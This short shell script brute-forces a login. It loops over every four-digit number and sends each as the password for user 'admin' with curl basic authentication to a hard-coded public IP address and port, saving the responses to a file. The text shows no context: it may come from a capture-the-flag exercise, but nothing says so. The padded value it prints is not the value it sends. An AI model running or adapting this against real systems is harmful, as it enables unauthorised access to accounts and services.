for i in `seq 0 9999`
do
    echo `printf %04d $i`
    curl http://54.92.103.68:9203 --user admin:$i >> res.txt
done